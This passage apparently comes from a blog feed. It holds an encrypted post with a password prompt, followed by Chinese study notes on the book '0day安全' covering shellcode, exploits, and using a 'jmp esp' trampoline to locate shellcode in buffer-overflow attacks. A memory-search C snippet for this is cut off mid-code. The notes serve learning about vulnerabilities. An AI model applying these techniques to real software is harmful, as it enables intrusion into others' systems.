4e52f54ad2f1cbefe28c2f14933ea06cd31af5791788b313fa2d261d7be49fbc139f5bf52913f984dc04831a769ec8dfc42d8815d2808a886a5a4b96ef088f2f4925ced51a3e65ee65c96db29cb3901c93abeeefed751903b7970b7382bb70410cf92574228d225b339e5d9ab996c36315308a8a51719748ec2d40f5d7a4c1bc203689cd8361f8d4f62ac535258d8c948a33bf89e9417e7fa83daaa67cfab44656700e0af5ea9580b8cc73a924833165ef6ad045a61f69da63d52ecef6496e3504dac58f5b8234039628201731b62cf8ffe180baaebe9862a8b2af8d1951299fd473719c686bfccf1c09f73db5a2c519907c5ca3f6795534adb847b4ce3f0b416f0d8bf6fbcb9dd089dedbd777757ccac5f59b4673248a28e831428ac750248517a7e1a572b081707fe78c07c7d2d7f1be7d73ce0a30426abec58319c9306c07314970421261eb1a3001dd3a1f0edd817c86ec416a61ff867535ad0c7e9ab5da962613010cc166570c8eacd5ef5a4a5ea6f97004319877ea9c5e3485c8368f12f8740868c8dbaa25b27d8178757c5a27268c9eb6f9282ae4941f6644b8c38c293715c6fa2c561e70f373c03ea157591e1a4ecbf09801bedddd6f4165177f010fdcbb39788951c835490a6833b0accc5bb47a92daa6b3efc5ae671fdfcbb41bcb47259a78b88ffb331120562da2fe7407de66f65080e5616f7331efa8d5ee793b6fe5ceb00f0816b741d3f680745879f3a537540c9a41c602dc723875466b3c86854b3ef808f311adbc27607ad4f46eec30bebc02e263e401f4c8766d94e42a8f7ef5de6a77c8f0cd5315920e1801900d46ee37a5a27e96a23eb0cfe183a9114a53919dce5335fb173fd0736a79fb8bf122cb2cf297e577f3c12da2f988639ab119dfbffacc7ccc9142984b5faea1762bfea6bf073c34ad4cd4d44d16e09f5a3964e0fd526e0029436adda522b573371fff989be4dab6d9774bb9067e254eaae8ca40bd5a92738da945af7151f328d0649bc8215a5e54b73bfdd3fd03eb53c2043b76ce69c846e8e0b22993b7ad3521ba4ca1fc8df01597e759b960e9e77843230e41ef1577ebc98cbb15d3d68ab67c0e420ad7ebc6c3888fa5eff26a30a8dbd5d0992d16262e0ab5d67da74c6c227f05213cee82dfe30ef3247e7a1ab6cc4e344d11a1f119c325e2b6ce7592f0ed494398a62ae6f5749154565dc56e54f804f8a46acda02dcb9fd6bdc8622549cc146d2fdeb5836732c521385468c1130e8eddef3297b6571aab27ab09ba737ae41a9a920a2b38593106b78273b2a020dac30986adb64594bde0e15a11c2b34405ade893b599f971bdeb41c5ee8785db705467999495ccb3e4bd929a18c8326cb5ff60142ef80afc1ca9fe2b134846d7d716086221345ba4b692b989a1fb8d03316f1dee7f4059496e714e8905f2db77c3421a7c16ac8890b2e6e1a2f869bc54662c16cb059e96ad82ada0ec538b3f4dd1945e1e468f1b24143fd105ff1695bce034be27bdabc5877681e5b7a09cee50c5f97e05ce4b7c1a4bb0ef2f44c47397b178f76aeaed47aca5d7f906fa78378fb029ca6ec774368f943d84a7ea88b3c79b550e9bfa3af51a2c5c1ef80a249fbd7a8386097dc2b8b47ebdf776684c63b0713d7568095ebc8ff681daa5689b4ffa292d1d4500dd01f87dd0860851dea5a4142f1b0b3d842290b9a441cb7706865eb68028507dc9320b687814dd689680fb4af0e678b3d544c69920b2dd63f999b29a9787b3a2511e5e500eea0bdbd3308fb396a1848917b0d90c4c464ee82a5a189fa92053d6cfc50bf5ed57bcea995624f6cac7602c8c7beabc0ebc37b560e5e749283f9eab2eeb5b7d4f693423721675670628a7138d93e6efd730e3e17863a28aa5fd9a26120cf4077496ef2fc5518de11de867a8cf0dbcd5c169f6f9cac0715af096598e95cb6af244bc4d77780f9890bf325e666911ee34317d56935f0b2f1fb391513fe3e1e8aa432958df52b8feb35942037baac8394c5eedeba483a29d5fbcfc1ecfe69b54176dac628bbead7def49149a166882b2d6c66321138a1f6c48c59dec45d382ada7a9c57d6c1f3a51ac95edbb1a3e6f5333b80c96d658ac36544b6b570eb31a71781b3f48e42374becbc5e96d21ff8c012e0555b27285b5927216b2cb484dec51d64e0a2f30bb161de0a22cbfbeccce655c29febd7eab2cfd3345b0df206bf2cef501e16466dc976aa96b311216599a77356a15729b11bfcf4fa928abbb7afd07e30c355fdd1f508a7e0b1e19c3ce227ed6498df7f8835423a138c6fadafb2b839734da1e2e15099c9f1503ee7913fc87a6a862ced43a1301a1b6ca4ad06634110a4dff52b3f71c229666476163a41b2d8ecfef3e3e498957725cb552ca923a91a5c4522e0da8790ca37266e276da0878687957eab6aba7b61c70f911a284e63cad458e2c9beaec536c6d3ecbcd60ce464d25f81e74c2a9a71d75310726393416dbd28d0835c235363dc3cdc16b890459b8b33f0688b3b8f65469cbb519dbd3afe4f7237ea9691c6104b029c4566fc0b49ba6417544674af080ee4284bba164b47ecf978624d7fcc5f79a21f6acbba40262bd35dd714e32e653813ad06a59ee3a0262582adcec1f0b3b19fbb1f5f52a4fba7ee38a1f449051b7f2beca84b49dfe0b1ea0e2428db5839f57e5be15fee7b697ac93cd838eebd3d656ee79a1f0ad56069833d16503cf924a94b9472dd77dd402cbcff991f6e2fad6f8270340652c3d5fe59cbc2a1dd097b6d7ad7c8c1f89182cf32878e0ffdfa67d5f35cb6d53d09f76ab52e7bf20700116903dadc398ba5e4af7a3af205da9eac525b1a100ad24de430907431b166ccac4afadde701097a7033ffeb809ef34f320abd062b7c0a8b717ea59f56cf8e179b48533b1b3b0ba963efb36890e7096089fb718dfb40fee97e79c8265e242cc43087511db3a68bfa339251d37118289517451a7a9c6ecf9e95c05070808f0582d8c59d291f7f7aace10df295c8531894642b941b02bc525311b437bc41ed671f89741067ac59b5457418a7a1bf6c8479b5154f181b2b3a4398a1240369b9460a7613a01e699da3fdac38daabee464e2809a47a01aa27d64d8fdbc0ff533cde311bec4893a72833ad913b491c7f9354013826a377a7e4294e981fb88996029f0f65179fc4e012974ed43cddf3ce4f4f9ee6ad64d41ed27d7842e529e6ea5317d90a905a6392cb23b584e2ee630512282b6e77551141c104b055b654b7bcfe7434fac2ada4bd904af3b5cc57b5323b83a1a1fb887ad1d6ecee101eba34811882259442a79fdda9849e469d2e1d5f0f829aba62fc148263a8f071b94aca45c690a2e509583b4d34fcd564f17cc4539195c61e9538d1c60747df52eeca1e8861cb8e66f8164274ba031f4c031498cd41b5ddfae655699e4dfd1bb148404b9604597d69b88296a02dca19f62295ad555267c0b474b86816aa49ce95dc3511370274358c6b556b34e95ffd6ab853799fda747aecb4d06bfd1d1527906635fca6bb6fb9429b62828270f7be80c8badee6e0e73a87fd3e5a8a078167e4b859555360cef701aec8a4cafee5354e3be16611b9b57c646424ddcda0d86a91e9f56b2977e0ce86e33fa41bf9da03a43ad7d80db9ee15c6f212a23245ecd708c632072fa6cfc04556f7ecd610d0db17a5e2d76afc0ffe31fae059906eb19468b022e9703df19b38efb301e166070b1cc6ecc8ed160b6120c37fbd32f6595bfd1cd235c1d849daa7e86b5f603dbdef32ad486bbffd5c2f307b86716f362d2b47b6bd5de055e6b6a33f17393127bd89dabe4ecb6c89657749ca41c4cc51005e131f7e6e138387e452c1b249dea643bbea5db5cc2ba45707da079f3972029860361ca83f2800aab3f777b6559e3a5432a57b9ac953aaa6c3a9fb3c9a85327dc133044bf8c1fb701a4eb1da1481164f19caaa7c325c4c43518b69767899db1d743dc1a7bea27bf5d179eacf0ca266bdbf81236ccc50b7417046fba99c90d8dc87f9f2c6d9fcd5bacf049baa326e947b22c6a344b085825e5ee14ace95dafe3629fd52bf081484b72c28f4eb390a5f268f6edd6c7b0536078d7250aa0d02c38de648351fd1750301d2cc481633928651060b4fb706171bed9e3aa6d7d6971fbe1150fa6ffd573f9e5ded6fd516939eb1e00fa2f9c527a4352609ed855bf068b21a7e87b67aa661d2dbaed19bb7eca479adba15a94077d8fc18d887ce4201e88fbdd0a7b4dc4d00c51e6c2dfefeed60d36b370b3635512d22f0970cb840640db48959ca6f6f381cd252673a5869216b444dd80b47b8ed0335f5f3d6a5c26033bbf6c3adecfb38dfa9ed5b9e846e42f1c21395c1266adc6637a84e72414a815f269420ff4e06be696c325cb54938276b5d9874c8dcdba26bd14fb72aef80b5bc33486d07699ea64f9ca8fe0d6c583b8121ba6ccb6fee472bb8a914ec550041166637b4a110ab579d235594a2580fc8d6a5a81cb5dea19bd2c22871d69fb860cef27af286bafe47e7353862ff69f169c043817214ccee48b748cfcd09607df0eaade2fd5cad0031a0a38abb24cdcfffbfafc838cfaa01581327a3f9ed9f72fded1fc1e4e263e5abd5b0cf200be30219b060d341d4786eb208d17bda61febec17c23ad824cd93297b384213e1b4ce17f188976b20861d7546aede2d8abae65238163a9a34b5bd730b4760710d94cbe9efea8f6a9ffdc656cc66f4123d10c4c436c9b06a7853152aecbba23ef8bda5f40d98c956fe494380d4b07eec6b45f018d06d7fec283078a728d66d7519c21fc6a6c28c2c95584c5adb04285d41b128703ede4fba7483e7a2eef6851b4f737ad1cc61e9d0bf4d90c04424ce420de6b81a17eb1032cb29dc1cfc51192e5034f9136d8e42f8642a2d92352636d13743cf1c087734b075a773b901bbe6cc3428f0b9c6d3b3981aa1c4140f86e5c5f8982db2e82b81b1f54ceac365a6cc13a1c156bd95deb32a2c2dfc45bb9e7ec41c50d261d3f55d4a45b4b918430d6dae4e305c17da1d0d33c6c7c0dadfafb21da93db85a5a24292faead92a0cf00d5d5faa3bd08b76d53ce5d9783a5c28a9de1985098871cf69c4057d0732fbbca7bade458c6d2f00cf2eea21b8a19dde79001a281fad1df92bd632473001659a49e5e93912e99c7781403a2a8366258b685eacacbd879b47f90a734172af440ebd20d9259db3e372365b62457d5aef083860a679e34b28d56ccf8958e86fc2338bc2c58fe2028f29d28951972e579f47b538e251d74adae2e4619227fdc98ffda7163ea38b4b9982482da30715dedeb34a5b25d6e64eaf3b57133ee90bc765fbcac52a4f77d4a26603d09dfcf222f668466826e57b3db25653be8e3f8c8b6b650e5cb23918819cd2c9cd310052ce99227af649bd67ff24eef82fc251147559f64ee6ef12e1ddea98571d06bc7605a6da7ec3bc430e61e7253ff14fa9fe325615b26a8996b32973af8e4c720bd8361c6740530dc820e66da5e04b5401103a4dd1fd6a1d89b44c9a6c9092b79ac70ec46d382dd1d05730ea7eeb55ad04c02bcd1abbcac55b50269bd6b91ffa818d145153366d887ef6859120ce4b00c008b9648c0c7256b278fd717fbaba8a6240fd7cb540ba67e92177d3edfa43ea1ab499936d2ab684c22e9dd3f51922ad5de78bedbfdec3d3edb4f9b6b4c876d705e3a3f2325795e0b4ae637e4e52b97e224feaf658e161cac9f519c3ebd3dc20d3e0248011ed881aa86c8f35fbbbf5bc1dd7a4c1aa360c3ff9b8a4a63d6d285b25260f9226eada598a917d33623b56d05254442e58058eb4c67c02fc9fb4ab4979c82ecf7d40d9b88831ab4eb1ff5b59e4a7fd5348e21bd7587b81272b909e21955717f01ee999e145852dcb6adf5c9711e1f17a0119d553ea100c873c7676e90da5d927764f85e9522862f50493115fcdfe154d8e26f569f7b4c240bd9d085a0c553757573c7b022df7af8701b136a8aa1654a4ef5436502d91476cfb8a440f8cb03cdd65cba8177187ed1c2dab9e71ca05d5bcfe4fa84cf5f5ee54fc70810cd76cc0c1fcafabcece872e353c900a907c4f5409b4a490dbeb26ade59a2654c4513abd1bb7f1be9ee6e3b9638b7e59ff94fac513db1fb5e3fd3bc487d0ef831a31447b156d7864b6807662eead1148263fe76dfd5ed62fac4a710d6791af377d8bb94191d276d79bf7e70d5137ce7c873dbf5a20bcc5b36e6c61b29b8b443b06bea0f097a332b1b849d78560fd8d1fcd003c7bd69adfd1dd6ee6001fb348a4c58a3462096830c40e194e501a033985605b2347688fd588c1296cac794615cc9303d9b68cfeed86c21da78e40744916381dc1dadc7e20db2c2ee84598a2976936123fa6ab4aa89350e7416d1451c1debdf72816663d506566cf1c6f3cbaae23ee20765a5029dfb04d6ac2a4ee42ee226d8579dc0ca19c07823c6cd96c87441c659e47c28378a01556b36711e92457e6e96c14026167e41c3d34abf57f9aaab1707ee268dc96415205a83b73f23698bf98c80dc95cede0018e373f4d85423eaf52673a08add76cb4884842d4dcc17fed6254efabc25b4e7b08c7b030059b1a19efdc3b8002cccf38abfef5e06605c6f18ca534a1fec8bdae5f1cb48c23d4c42ab11fe316d0f7beac1fa9533250ca68d951a30be2e6cd9bb99de2eda7455f366f1cfdee2d1d8ca36af01c9f575d00c751dea8c889e63635a009fa5b855cbafba2d2d1fc6c4cb2a060f91dae59c11d200ca99bfa835a054682fdc728b517c9cb2e19200dc2fb007b63a6ceb38913a298fb32bcf3809cbb87b7fc199b1f8393741a75afd9b6829d438f3563816b6dec6a4d6228266f642129c84b1672bf010b3ec2497fb40fa7bafd1c8362aa7a470b5783448cfce75e8be11856a36162a2978109daf8b7e50d7eb1037baee8f3caf4b29091bbc1d35a4923d04a965d67b720156971e18a08a60035c2f77e142d3001db9f738debb9b0613187ff5553b7f1e03ae8017a160c9a907263a06a5886ce3aaed546126cf9207b749ca3cb4ec66665eea06493e01eb0ab356f1e9bfb1997b61cbac5ce6795f19b618db2331596d9bf5a5f2201d9a1b9a39cae81ae8b24a836061f7abe80f0b5d808c588be5e069dde70c9b4ec432b252e89a5e6f26d88cf300ae95ba71030ced346a61750a1acdaa81fe59454221dd34db547e02b511d4a385f73b877f9261ce33b33dd5b054ac4ddaf3c3fa2c36703f14a0279d36e183fba25f18f8cfd7adbcbc06e50605f744e146df4142fa0b3478329a61af414d6e204c9a29ddd6b69daff2db60b3ea799c632d1608430ca09f4eb5871d4d48f761ca70504105439b99a73f78a3ae45c40131dc50dafd429f0fe2d43df8a49f65cf2a5d7b1326200ffe4029df2a2cf8bed7fdcf6235f767cffafe2c29db6c8a82e1bf4b0818acdfd0cfd23ee05eefc567d6439141b0c976d72cd7863faa6bab3ea4fec1d419ca68324fdbcd622d7d880d043df15ead562a9f34c5996617ce88617622eca8f5a6f3705af9d1441a443b01f486550ecdc8b234baf79b0b7f1ba4c781bfbae0f4bf0fbf522c68d4048742590b985f1067a896587827fef45c1846d8212d2045dac99012624559ca465719f25d6a1169a77aaa795cac8f6d9633fcf5ab30a12b9040c11f3a1bcddae25e8fc88e20d68d65194e14d000b0a74568eda09bb60620a50a398f4e8b18a9a53bacaf48e7306d8f882c5a882d09785beccc5397dcaa38eb58ef7f8a3ec79e3368dea3ee897fa62a6396a924f95e7e28e7d3109d0dbdc32327ce37861d12f0be8ccb1f832523dbf65838e4210af881e364b4996bc72408715be3b2b69e21e612eb5d70ea9d050f09ebfea0a3e863f08698d538f911dcb0a3eed31305503d8c3071aa9dbec5231816f4cda6ecf3751494cf17ae37aac4da461f0f99e40e6cdd23cc9ed356aff776be86c485f3bb60946b6ada09de11e61ffe134064151b094c7d003b454aa413ab6730aeb041cadddd9f2981c6955235c6d84e03b0b426962e491fbff48af08abe81eae33bbd73bfda8fbb2cc28ae147442a459164d21c8bbe159529ee1dbbf23f81a08f4e1ae656f552cfce83eb2ba0e69539d5adef529763a42335b4b35df969d61eacf8e1d79b7b91b4a281b2e0128cbfacba017ba8ae57976995ea9c4946b745cbfe7603a9d9b22dfb80f8c3e839767535297e057b4562c64aeb60b2cba59a8b8d0cd495367cfdb1a6ff79d292e0dcf3cc27defeeeb2d9c2a46079756c927f4395d7a7ed0a40e61b361b75fdfc38d42dea8c3ea07b0639bf80efa7700c2a84f72806906c9f323bf1b46944c613ddd2e95b5c6e850abbdab7ebfb78192b5e2549c5e267af990c710733130183b7c990712deae65a354f551310159fadfa2df5540278dbe3b10743dfbf003f680c36120e734c181294a24a65cc235a60c2069ff50b30f1197004bd6bfafc422787c4e85ace558e73767a62d21ba7ee701311114e63a2e758334a36e3bab8648c06e25b384331e985a4a4d2204f1f096147826fef5ba9d6b4ac846cf93c438d489910310350c0d09cf19570f8511881506a7e80d65cb0fc88a35f2da4e1b9b0ca275edcfc8f33caa71f39b171bc720b408b891d71f1c6b3f6a5adf65c5f1e9bd60d0ae061490146764121b0fb1b04db41521686462a2c30a7df881298ad5ebf8de0b01fc511e33bd790191c9239e34b38f5548e3a3419b82e60d839f576e82b90ed3612be95d94454703de7029b6cc948c8b1ea238c49a5f300a951a45cc3021a021d8f72816130cab5e1088fb0477708723188d098320949143d2f3ccbac146a9a7d29a7132287ce82188af0652cbe1419562182a1bb3e815ad516254b167e343eb595d9eebb06548d6d18e6b6fbacf39e5361e37b78b251039b0ab88ad8fd82fbef89186efdec8d8ebad5cb2af6c4606a26ebaed421ab1fe5abe2cc80b1dc0678303ab8251525a93e2391c13b5a7a82c0b9da65931cb139624fef7f155542955578060a02d558ac045b56ba3931e4d465285ecc9de3e8bec9b4b2cdc2ed1c445d6877ca195b44b3c58e0024599f0710d543c0d2305b63d963581729a8ebdbecece45ced90fbd976562e0c6e54c2a9b0a499ba0c6f8dd5663dbaa723d5f198c8b391230260eee787404e0fd3c0a8dc33864f61c1954b25534964347e1f03975a7722157e202f17cc1a75898223d4f320eebf36ef1b33c35fba04fff602fac3da1f04dd5ab5f4e6bdc11a504ad2c4cfdb8330f0058687da9d5716a1de8257f17b3ac4925203d5976baf2f6786af68ca4c9acb9786a1cc543f068302ac82b1be286ebcf244220c8f4643b38446c9d9b0143424c28046c3db87d098acccb70ea55a34d1e046cf6af7980ad93e52f2554e0c36e3b9ced855f60f2a1d5fca5f0a02ce2ad433240240bccccc2903991f32cc6987c2eac45dfd788afb86904dfd37ade4c629286f28078efb8dd394cbad145f149d4d1c7313685b7d034c3b3ec53ccbe23aa28da4ae66be2217485d6e3f5c6ab2a4bbf02e83d98dbd13378f0c04bd8272f4bc005270f5feb91f7eec740ef1908757703632482c7d90be8912184e6936547bc481614913d08b10672a4136be6c57da1d999aa77aaac9ced3e85bf92e301b64e08efe285d05486335f7dac3b3905bf18e5279e6e092a0e694806eb9b147da0e6f600daecff02085d3f843a2ee2c49c83195056e40a87777a3c0020f336440a86d0eb5eedc7df5266d6686015f7eed37ba2efbebb1b915bf24907d61aacfef88d274026f20b097bcdc5d09875c1d833b2dd6c3f6cc31672ae8cfcb352bacbf531de564daa9adc526e903f327e5cf595c450fb1d50e822b48c00861112825b359f860ea7549e6378f36c1e6b0c5c7dc6161fdc41cb5cbbd32895492e2f7c2170b67edb3b2dd991ac58a6cd0e5ff107b3c655ede48769c219d0ba46e65a5ef8ce2dac7ffee89155edd9775029a08b4a3a5eb12cf40aac91062a6d6ec2bd159f427f23222c5d907cbd9bfaedd1978f73f497843ab3950fb08d76e9f80618f949475e855226ab7b379abdda4e9332c940ae23f257f3d1d12c406981c91e637bc601de49fddc947b4c84fbab5ac5824eef9389549a788238e02230cf5f6a15a04840f679f3745c309ab988fa202af60a351e5c0d8e939de8869dec6f0148d329249ef67860fa847d8c3bb2762afcedb00333c1faba05f696dde9abe78698fa7d8d107b13b914dba2ea842089704e33029fde5d9bc09b19858c085727847a3fecc5bc32e4d090361aedb47574dc81ea674c5279f10c3ee75a4631c9ce60b85079f22558eaf3c5f92c0eacffde43a8b66e4b75986ff80bc1c9ca78d6f0fe7efa302ded25d2fa147bd1c56d395a005b6241bbbeb22e2a0395111981228ab635b43ed96fe7fbc1cbf9c5da0e88aaddb214cffd2d4430b827865829d12952d9147f4fe1f7b39f78eaa25993eafa04210a9777c95d43f9c51db1506e3c33a72ffc29c3236749751cd081b96c37a3fa7f28d5661bf860e0f47249f39ca03353be0dc551aba7d4ad23638552f4e552aec23f48b098fb6341872c2924bbb2de9a035d787c59759979b2da50a8e4a00b25c61fc4a4a64a5d3584e753e1faaf160c4ca81e02b0ee23bc63a2a04c08bc700afc7a0ded1abd9dab9539eeb9a5b20876c95ca32d7f0f6f0c9f1e31ded8c07bc90a24dbe66e63c9c3ddfc04adb122f70ff0309fa50d30f27ac5aefed5dd5f38c9a5187ccf6af04354e732a81a4f7b68f7ec19bf724df502b3bd710af9d0bb3b9a0eb0b77685bcad37238a6660a68c8006fba93931e5e4051d110058b4dac7c81cd013a5aaffcce6ab6a0aeddbb49e544e0ef29e9158440b95d13f737d2480b1d8973ec3308085497054a2a4737e354dbb70b279773de8957e60b3a835d718b354b3d07db1d3451e605f491cfe942260637690bd07f76fbfa14d9a44e43093342b246d3d14bd4c31a9a474378e6219adc1b3fa4d6bba8e2d1e2e86582fbc76e7575d8c433edd11d7dd23bbbf8479a72a8b7a7d74b6d5c03859621ced0238236ab9a363bd6c2dbd014f4472c82842bd0ab0891119f95c46d60ea0c82e9a29ba882f49e2c86c0d4a6ce2a8be0bf4d823440133a91a15e4360daf4be21d1a6a888d748e862dd63e644df4c555b380bc884fd44dc7b1973d27d2a980a4aaed3bfe9d630aab14eeef2bf71ccf6b9ad575c01309b66fd1e8eaff6391a16946fd8914c90c873eee7b66323ea5ecdcd1a6709b86cf0e308dec3e69ee282174da36e82</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>XXE</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>XXE</tag>
        <tag>XML</tag>
      </tags>
  </entry>
  <entry>
    <title>0day安全：软件漏洞分析技术（第二版）读书笔记（3-4）</title>
    <url>/post/0day2-3-4/</url>
    <content><![CDATA[<p>漏洞利用技术才是实施有效攻击的最核心技术，才是突破安全边界、实施深度入侵的关键所在。ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭ </p>
<span id="more"></span>

<h2 id="第三章-开发shellcode的艺术"><a href="#第三章-开发shellcode的艺术" class="headerlink" title="第三章 开发shellcode的艺术"></a>第三章 开发shellcode的艺术</h2><h3 id="3-1-shellcode概述"><a href="#3-1-shellcode概述" class="headerlink" title="3.1 shellcode概述"></a>3.1 shellcode概述</h3><h4 id="3-1-1-shellcode-exploit-poc"><a href="#3-1-1-shellcode-exploit-poc" class="headerlink" title="3.1.1 shellcode | exploit | poc"></a>3.1.1 shellcode | exploit | poc</h4><div class="note warning"><p><mark class="label warning">shellcode</mark><mark class="label success">exploit</mark><mark class="label primary">poc</mark></p>
<p><mark class="label warning">shellcode</mark>：通称缓冲区溢出攻击中<mark class="label default">植入进程的代码</mark>。shellcode往往需要用汇编语言编写，并转换成二进制机器码，其内容和长度经常还会受到很多苛刻限制，故开发和调试的难度很高。</p>
<p><mark class="label success">exploit</mark>：植入代码之前需要做大量的调试工作，例如</p>
<ol>
<li>弄清楚程序有几个输入点；</li>
<li>这些输入将最终会当作哪个函数的第几个参数读入到内存的哪个区域；</li>
<li>哪一个输入会造成栈溢出；</li>
<li>在复制到栈区的时候对这些数据有没有额外的限制等。</li>
</ol>
<p>调试之后还要计算函数返回地址距离缓冲区的偏移并淹没之，选择指令的地址，最终制作出一个有攻击效果的“承载”着shellcode的输入字符串。这个<strong>代码植入的过程就是漏洞利用</strong>，也就是<strong>exploit，简称EXP</strong>。</p>
<p><mark class="label danger">Exploit负责将程序导向shellcode，shellcode又称为payload。</mark></p>
<p><mark class="label primary">poc</mark>：PoC(Proof of Conecpt)，概念性证明，是证明漏洞存在而提供的一段代码或方法，只要能够触发漏洞即可。用其对漏洞进行验证。</p>
</div>

<p>shellcode 这段代码可以是出于恶作剧目的的弹出一个消息框，也可以是出于攻击目的的删改重要文件、窃取数据、上传木马病毒并运行，甚至是出于破坏目的的格式化硬盘等。请注意本章讨论的shellcode是这种广义上的植入进程的代码，而不是狭义上的仅仅用来获得shell的代码。</p>
<div class="note primary"><p>exploit一般以一段代码的形式出现， 用于生成攻击性的网络数据包或者其他形式的攻击性输入。expliot的核心是淹没返回地址劫持进程的控制权，之后跳转去执行shellode，与<mark class="label info">shellcode具有一定的通用性</mark>不同，exploit往往是针对特定漏洞而言的。<mark class="label warning">exploit关心的是怎样淹没返回地址，获得进程控制权，把EIP传递给shellcode让其得到执行并发挥作用，而不关心shellcode到底是何用途。</mark></p>
</div>

<h4 id="3-1-2-shellcode需要解决的问题"><a href="#3-1-2-shellcode需要解决的问题" class="headerlink" title="3.1.2 shellcode需要解决的问题"></a>3.1.2 shellcode需要解决的问题</h4><p>在上节的代码植入实验中，我们直接用 OllyDbg 查出了栈中shellode的起始地址。而在实际调试漏洞时，尤其是在调试 IE 中的漏洞时，我们经常会发现有缺陷的<strong>函数位于某个动态链接库中</strong>，且在程序运行过程中被动态装载。这时的栈中情况将会是动态变化着的，也就是说，这次从调试器中直接抄出来的shellcode起始地址下次就变了。<strong>要编写出比较通用的shellcode就必须找到一种途径</strong><mark class="label success">让程序能够自动定位到shellode的起始地址</mark>。</p>
<div class="note success"><p><strong>要编写出比较通用的shellcode就必须找到一种途径</strong><mark class="label success">让程序能够自动定位到shellode的起始地址</mark>。</p>
<p>不同的机器、操作系统中同一个API函数的入口地址往往会有差异，必须让shellcode自己运行时<strong>动态地获得当前系统的API地址</strong>。</p>
</div>

<h3 id="3-2-定位shellcode"><a href="#3-2-定位shellcode" class="headerlink" title="3.2 定位shellcode"></a>3.2 定位shellcode</h3><h4 id="3-2-1-栈帧移位与jmp-esp"><a href="#3-2-1-栈帧移位与jmp-esp" class="headerlink" title="3.2.1 栈帧移位与jmp esp"></a>3.2.1 栈帧移位与jmp esp</h4><h5 id="栈帧移位"><a href="#栈帧移位" class="headerlink" title="栈帧移位"></a>栈帧移位</h5><p>第二章修改返回地址的代码植入实验，用越界的字符完全控制返回地址后，需要将返回地址改写成 shellode 在内存中的起始地址。在实际的漏洞利用过程中，由于动态链接库的装入和卸载等原因，Windows 进程的函数栈帧很有可能会产生“移位”，即 shellcode 在内存中的地址是会动态变化的，因此如果单纯地将返回地址简单地覆盖成一个定值的做法往往不能让 exploit 奏效，如图3.2.1所示。所以必须想出一种方法能够<mark class="label primary">在程序运行时动态定位栈中的shellcode的起始地址</mark>。</p>
<p><img data-src="https://i.loli.net/2021/02/07/7S1GX2o9WcsNqfr.png" alt="29.png"></p>
<h5 id="jmp-esp"><a href="#jmp-esp" class="headerlink" title="jmp esp"></a>jmp esp</h5><p>一般情况下，ESP寄存器中的地址总是指向系统栈中且不会被溢出的数据破坏。函数返回时，ESP所指的位置恰好是我们所淹没的返回地址的下一个位置（32位系统返回地址+4），即栈顶。如图3.2.3左图所示。</p>
<p>提示：函数返回时，ESP 所指位置还与函数调用约定、返回指令等有关。</p>
<div class="note danger"><p>对于<mark class="label default">jmp esp 原理</mark>理解：</p>
<ol>
<li>程序先去执行<code>jmp esp</code>这条指令，这条指令的含义是跳转到寄存器 ESP 里面的地址去，<code>jmp esp</code>指令在进程中有独立地址，可查找。</li>
<li>ESP寄存器的内容刚好是函数返回时调用者函数的栈顶，如果将 shellcode 的起始地址紧跟在<code>返回地址+4</code>的区间里面去，则指令执行完被淹没的返回地址里面<code>jmp esp</code>指令后继续执行 shellcode。</li>
</ol>
</div>

<h5 id="动态定位shellcode"><a href="#动态定位shellcode" class="headerlink" title="动态定位shellcode"></a>动态定位shellcode</h5><p>由于ESP寄存器在函数返回后不被溢出数据干扰，且始终指向返回地址之后的位置，我们可以使用图3.2.3所示的这种定位 shellcode 的方法来进行动态定位。这里的<code>jmp esp</code>被称作<mark class="label info">跳板</mark>。</p>
<div class="note default"><p><mark class="label danger">JMP ESP 原理</mark></p>
<ol>
<li><p>用内存中任意一个<code>jmp esp</code>指令<mark class="label warning">的地址</mark>覆盖函数返回地址，而不是原来用手工查出的 shellcode 起始地址直接覆盖。</p>
</li>
<li><p>函数返回后被重定向去执行内存中的这条<code>jmp esp</code>指令，而不是直接开始执行shellcode。</p>
</li>
<li><p>由于 esp 在函数返回时仍指向栈区（函数返回地址之后），<code>jmp esp</code>指令被执行后，处理器会到栈区函数返回地址之后的地方取指令执行。</p>
</li>
<li><p>重新布置shellcode。在淹没函数返回地址后，继续淹没一片栈空间。将缓冲区前边一段地方用任意数据填充，把 shellcode 恰好摆放在函数返回地址之后。这样，<code>jmp esp</code>指令执行过后会恰好跳进 shellcode。</p>
</li>
</ol>
</div>

<p><img data-src="https://i.loli.net/2021/02/07/41dZs2vxVRz9pXe.png" alt="30.png"></p>
<h4 id="3-2-2-获取“跳板”的地址"><a href="#3-2-2-获取“跳板”的地址" class="headerlink" title="3.2.2 获取“跳板”的地址"></a>3.2.2 获取“跳板”的地址</h4><p>必须首先获得进程空间内一条<code>jmp esp</code>指令的地址作为 “跳板”。程序运行时，除了 PE 文件的代码被读入内存空间，一些经常被用到的动态链接库也将会同被映射到内存。其中，诸如<code>kernel32.dll</code>、<code>user32 dll</code>之类的动态链接库会被几乎所有的进程加载，且<strong>加载基址始终相同</strong>。</p>
<p><strong>实验</strong></p>
<p>执行 shellcode 章节（2.7）实验中的有漏洞的密码验证程序已经加载了<code>user32dll</code>，所以我们准备使用<code>user32.dll</code>中的<code>jmp esp</code>作为跳板。<strong>获得<code>user32.dll</code>内跳转指令地址最直观的方法就是编程序搜索内存</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLL_NAME <span class="meta-string">&quot;user32.dll&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    BYTE* ptr; </span><br><span class="line">    <span class="keyword">int</span> position,address;</span><br><span class="line">    HINSTANCE handle; </span><br><span class="line">    BOOL 